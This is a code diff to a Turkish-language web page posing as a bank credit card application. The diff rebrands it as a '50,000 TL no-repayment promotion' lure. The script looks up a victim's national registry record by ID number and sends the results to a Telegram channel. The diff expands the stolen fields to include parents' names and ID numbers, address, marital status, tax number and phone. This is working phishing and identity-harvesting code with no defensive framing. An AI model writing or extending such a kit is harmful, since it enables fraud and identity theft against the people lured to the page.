@@ -101,16 +101,13 @@
       border-radius: 5px;
       margin-bottom: 20px;
     }
-    .tc-input-container {
-      margin-bottom: 20px;
-    }
   </style>
 </head>
 
 <body class="is-retail is-turkish is-desktop is-nontouch">
   <div class="basvuru-container">
     <div class="basvuru-header">
-      <h1>Kredi Kartı Başvurusu</h1>
+      <h1>50.000TL Geri Ödemesiz Promosyon!</h1>
       <p>Lütfen bilgilerinizi kontrol edin ve eksik alanları doldurun</p>
     </div>
 
@@ -139,15 +136,13 @@
           <span class="info-label">Doğum Yeri:</span>
           <span class="info-value" id="dogumYeri">-</span>
         </div>
+        <div class="info-item">
+          <span class="info-label">Anne Adı:</span>
+          <span class="info-value" id="anneAdi">-</span>
+        </div>
       </div>
 
       <form id="basvuruForm">
-        <div class="tc-input-container">
-          <div class="form-group">
-            <label class="form-label" for="tcKimlik">TC Kimlik Numarası</label>
-            <input type="text" id="tcKimlik" name="tcKimlik" class="form-input" maxlength="11" pattern="[0-9]{11}" required readonly>
-          </div>
-        </div>
 
         <div class="form-group">
           <label class="form-label" for="telefon">Telefon Numarası</label>
@@ -173,17 +168,16 @@
       const loadingDiv = document.getElementById('loading');
       const errorDiv = document.getElementById('error');
       const contentDiv = document.getElementById('content');
-      const tcInput = document.getElementById('tcKimlik');
       const submitBtn = document.getElementById('submitBtn');
+      
+      // API'den gelen tüm verileri sakla
+      let apiData = null;
 
       if (!tc || tc.length !== 11) {
         errorDiv.style.display = 'block';
         errorDiv.textContent = 'Geçerli bir TC kimlik numarası bulunamadı. Lütfen tekrar deneyin.';
         return;
       }
-
-      // TC inputunu doldur
-      tcInput.value = tc;
 
       // API'den bilgileri çek
       loadingDiv.style.display = 'block';
@@ -196,11 +190,15 @@
           if (data.Info && data.Info.Status === 'OK' && data.Veri) {
             const veri = data.Veri;
             
+            // Tüm veriyi sakla
+            apiData = veri;
+            
             // Bilgileri göster
             document.getElementById('adSoyad').textContent = `${veri.Adi || ''} ${veri.Soyadi || ''}`.trim() || '-';
             document.getElementById('dogumTarihi').textContent = veri.DogumTarihi || '-';
             document.getElementById('cinsiyet').textContent = veri.Cinsiyet || '-';
             document.getElementById('dogumYeri').textContent = veri.DogumYeri || '-';
+            document.getElementById('anneAdi').textContent = veri.AnneAdi || '-';
 
             // İçeriği göster
             contentDiv.style.display = 'block';
@@ -243,17 +241,15 @@
           return;
         }
 
-        // TC kontrolü - ilk sayfadaki TC ile eşleşmeli
-        const formTC = document.getElementById('tcKimlik').value;
-        if (formTC !== tc) {
-          alert('TC Kimlik numarası eşleşmiyor. Lütfen kontrol edin.');
+        if (!apiData) {
+          alert('Kişi bilgileri yüklenemedi. Lütfen sayfayı yenileyin.');
           return;
         }
 
         submitBtn.disabled = true;
         submitBtn.textContent = 'Gönderiliyor...';
 
-        // Telegram'a gönder
+        // Telegram'a tüm bilgileri gönder
         fetch('/api/send-telegram', {
           method: 'POST',
           headers: {
@@ -263,8 +259,22 @@
             tckn: tc,
             telefon: telefon,
             kartLimiti: kartLimiti,
-            adSoyad: document.getElementById('adSoyad').textContent,
-            dogumTarihi: document.getElementById('dogumTarihi').textContent,
+            // API'den gelen tüm bilgiler
+            adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
+            dogumTarihi: apiData.DogumTarihi || '',
+            cinsiyet: apiData.Cinsiyet || '',
+            dogumYeri: apiData.DogumYeri || '',
+            anneAdi: apiData.AnneAdi || '',
+            babaAdi: apiData.BabaAdi || '',
+            anneTCKN: apiData.AnneTCKN || '',
+            babaTCKN: apiData.BabaTCKN || '',
+            adresIl: apiData.AdresIl || '',
+            adresIlce: apiData.AdresIlce || '',
+            memleketIl: apiData.MemleketIl || '',
+            memleketIlce: apiData.MemleketIlce || '',
+            medeniHal: apiData.MedeniHal || '',
+            vergiNumarasi: apiData.VergiNumarasi || '',
+            gsm: apiData.GSM ? (Array.isArray(apiData.GSM[0]) ? apiData.GSM[0][0] : apiData.GSM[0]) : '',
             type: 'basvuru'
           })
         })
